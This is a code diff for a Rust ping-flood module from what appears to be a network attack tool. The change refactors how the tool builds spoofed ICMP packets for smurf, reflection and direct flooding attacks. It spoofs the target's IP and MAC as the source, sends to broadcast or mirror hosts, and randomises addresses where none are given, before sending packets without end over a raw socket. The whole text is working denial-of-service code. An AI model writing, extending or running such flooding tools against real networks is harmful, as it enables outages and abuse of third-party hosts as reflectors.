@@ -6,7 +6,7 @@ use crate::generators::RandValues;
 use crate::iface::IfaceInfo;
 use crate::pkt_builder::PacketBuilder;
 use crate::sockets::Layer2RawSocket;
-use crate::utils::{inline_display, get_first_and_last_ip, CtrlCHandler, use_local_or_input_mac};
+use crate::utils::{ inline_display, get_first_and_last_ip, CtrlCHandler, abort, parse_mac };
 
 
 
@@ -15,13 +15,13 @@ pub struct PingFlooder {
     rand:       RandValues,
     builder:    PacketBuilder,
     iface:      String,
-    broadcast:  Ipv4Addr,
     pkts_sent:  usize,
-    pkt_info:   PacketInfo,
+    pkt_data:   PacketData,
 }
 
 
-struct PacketInfo {
+#[derive(Default)]
+struct PacketData {
     src_ip:  Option<Ipv4Addr>,
     src_mac: Option<[u8; 6]>,
     dst_ip:  Option<Ipv4Addr>,
@@ -40,7 +40,7 @@ impl PingFlooder {
             rand:      RandValues::new(Some(first_ip), Some(last_ip)),
             builder:   PacketBuilder::new(),
             pkts_sent: 0,
-            pkt_info:  PacketInfo {None, None, None, None},
+            pkt_data:  Default::default(),
             iface,
             args,
         }
@@ -49,36 +49,77 @@ impl PingFlooder {
     
     
     pub fn execute(&mut self){
-        Self.set_pkt_info();
+        self.set_pkt_info_for();
         self.send_endlessly();
     }
 
 
 
-    fn set_pkt_info(&mut self) {
+    fn set_pkt_info_for(&mut self) {
         if self.args.smurf {
-            self.set_info_for_smurf_attack();
-        } else if self.args.mirror_ip {
-            self.set_info_for_reflection_attck();
+            self.smurf_attack();
+        } else if self.args.mirror_ip.is_some() {
+            self.reflection_attack();
+        } else {
+            self.direct_attack();
         }
     }
 
 
 
-    fn set_info_for_smurf_attack(&mut self) {
-        self.pkt_info.src_ip  = self.args.target_ip;
-        self.pkt_info.src_mac = self.args.target_mac;
-        self.pkt_info.dst_ip  = IfaceInfo::get_broadcast_ip(&self.iface);
-        self.pkt_info.dst_mac = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF];
+    fn smurf_attack(&mut self) {
+        self.pkt_data.src_ip  = Some(self.args.target_ip);
+        self.pkt_data.src_mac = self.resolve_mac(Some(self.args.target_mac.clone()));
+        self.pkt_data.dst_ip  = Some(IfaceInfo::get_broadcast_ip(&self.iface));
+        self.pkt_data.dst_mac = Some([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
     }
 
 
 
-    fn set_info_for_reflection_attck(&mut self) {
-        self.pkt_info.src_ip  = self.args.target_ip;
-        self.pkt_info.src_mac = self.args.target_mac;
-        self.pkt_info.dst_ip  = self.args.mirror_ip.unwrap();
-        self.pkt_info.dst_mac = use_local_or_input_mac(&self.args.mirror_mac);
+    fn reflection_attack(&mut self) {
+        self.pkt_data.src_ip  = Some(self.args.target_ip);
+        self.pkt_data.src_mac = self.resolve_mac(Some(self.args.target_mac.clone()));
+        self.pkt_data.dst_ip  = self.args.mirror_ip;
+        self.pkt_data.dst_mac = if self.args.mirror_mac.is_none() {
+                None 
+            } else {
+                self.resolve_mac(self.args.mirror_mac.clone())
+            };
+    }
+
+
+
+    fn direct_attack(&mut self) {
+        self.pkt_data.src_ip  = self.args.src_ip;
+        self.pkt_data.src_mac = if self.args.src_mac.is_none() {
+                None
+            } else {
+                self.resolve_mac(self.args.src_mac.clone())
+            };
+
+        self.pkt_data.dst_ip  = Some(self.args.target_ip);
+        self.pkt_data.dst_mac = self.resolve_mac(Some(self.args.target_mac.clone()));
+    }
+
+
+
+    fn resolve_mac(&self, input_mac: Option<String>) -> Option<[u8; 6]> {
+        if input_mac.is_none() {
+            return None;
+        }
+
+        let mac = input_mac.unwrap();
+
+        let mac_to_parse = if mac == "local" {
+            IfaceInfo::get_mac(&self.iface)
+        } else {
+            mac
+        };
+
+        match parse_mac(&mac_to_parse) {
+            Err(e)  => { abort(e) },
+            Ok(mac) => { Some(mac) },    
+        }
     }
 
     
@@ -103,35 +144,12 @@ impl PingFlooder {
 
     #[inline]
     fn get_packet(&mut self) -> &[u8] {
-        let (src_mac, src_ip) = self.get_src_addrs();
-        let (dst_mac, dst_ip) = self.get_dst_addrs();
-
         self.builder.icmp_ping_ether(
-            src_mac, src_ip,
-            dst_mac, dst_ip
+            self.pkt_data.src_mac.unwrap_or_else(|| self.rand.get_random_mac()),
+            self.pkt_data.src_ip.unwrap_or_else( || self.rand.get_random_ip()),
+            self.pkt_data.dst_mac.unwrap_or_else(|| self.rand.get_random_mac()),
+            self.pkt_data.dst_ip.unwrap_or_else( || self.rand.get_random_ip())
         )
-    }
-
-
-
-    #[inline]
-    fn get_src_addrs(&mut self) -> ([u8; 6], Ipv4Addr) {
-        if self.args.smurf {
-            return (self.args.target_mac, self.args.target_ip);
-        }
-
-        (self.rand.get_random_mac(), self.rand.get_random_ip())
-    }
-
-
-
-    #[inline]
-    fn get_dst_addrs(&mut self) -> ([u8; 6], Ipv4Addr) {
-        if self.args.smurf {
-            return ([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF], self.broadcast);
-        }
-
-        (self.args.target_mac, self.args.target_ip)
     }
 
 }
